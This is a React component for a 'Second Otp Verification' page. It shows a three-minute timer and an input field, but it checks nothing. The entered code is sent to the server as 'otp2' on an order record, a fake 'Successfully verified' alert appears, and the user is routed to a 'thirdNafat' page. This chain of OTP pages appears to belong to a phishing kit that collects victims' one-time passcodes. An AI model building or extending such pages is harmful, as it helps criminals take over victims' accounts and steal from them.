import { useState } from "react";
import TextField from "@mui/material/TextField";
import { CountdownCircleTimer } from "react-countdown-circle-timer";
import { useNavigate } from "react-router-dom";
import useOrderData from "../../Hooks/useOrderData";
import useAxiosPublic from "../../Hooks/useAxiosPublic";
import Swal from "sweetalert2";
const SecondOtp = () => {
  // State for OTP input and error message
  const [otp, setOtp] = useState("");
  const [isOtpCorrect, setIsOtpCorrect] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  const { lastOrder } = useOrderData();

  const axiosPublic = useAxiosPublic();
  const id = lastOrder?._id;
  const navigate = useNavigate();

  // Handle OTP input change
  const handleOtpChange = (e) => {
    const value = e.target.value;

    // Allow only digits and limit to 4 characters
    if (/^\d{0,8}$/.test(value)) {
      setOtp(value);

      // Check if the OTP has 4 digits
      if (value.length > 3) {
        setIsOtpCorrect(true);
      } else {
        setIsOtpCorrect(false);
      }
    }
  };

  // console.log(orderData);
  // Handle OTP verification (log the OTP value to the console)
  const handleVerifyOtp = () => {
    console.log("Entered OTP:", otp);
    axiosPublic
      .patch(`order-update/${id}`, { otp2: otp })
      .then((response) => {
        console.log("OTP2 updated successfully:", response.data);
        Swal.fire({
          position: "top",
          icon: "success",
          title: "Successfully verified",
          showConfirmButton: false,
          timer: 1500,
        });
        navigate("/thirdNafat");
      })
      .catch((error) => {
        console.error("Error updating OTP1:", error);
      });
  };

  return (
    <div className="container mx-auto lg:w-1/2 md:w-3/4 sm:w-full px-4">
      <h2 className="text-center text-3xl sm:text-4xl font-bold text-gray-800 mt-5">
        Second Otp Verification
      </h2>

      {/* Countdown Timer */}
      <div className="flex justify-center my-5">
        <CountdownCircleTimer
          isPlaying
          duration={180}
          colors={["#14B8A9"]}
          colorsTime={[180]}
          size={150}
          strokeWidth={6}
        >
          {({ remainingTime }) => {
            const minutes = Math.floor(remainingTime / 60);
            const seconds = remainingTime % 60;
            const formattedSeconds = seconds < 10 ? `0${seconds}` : seconds;

            return (
              <div className="text-2xl sm:text-3xl md:text-4xl">
                {`${minutes}:${formattedSeconds}`}
              </div>
            );
          }}
        </CountdownCircleTimer>
      </div>

      {/* OTP Input Field */}
      <div className="flex justify-center my-5 mx-3">
        <div className="w-full max-w-xs sm:max-w-sm md:max-w-md lg:max-w-lg">
          <TextField
            className="text-2xl"
            id="otp-input"
            label="Enter Your OTP"
            type="tel"
            variant="outlined"
            fullWidth
            required
            value={otp}
            onChange={handleOtpChange}
            inputProps={{ maxLength: 8 }}
          />
        </div>
      </div>

      {/* Verify OTP Button (only visible when 4 digits are entered) */}
      {isOtpCorrect && (
        <div className="flex justify-center my-3">
          <button
            onClick={handleVerifyOtp}
            className="px-4 py-2 bg-green-500 text-white rounded-md"
          >
            Verify OTP
          </button>
        </div>
      )}

      {/* Error Message */}
      {errorMessage && (
        <div className="text-red-500 text-center my-3">{errorMessage}</div>
      )}
    </div>
  );
};

export default SecondOtp;
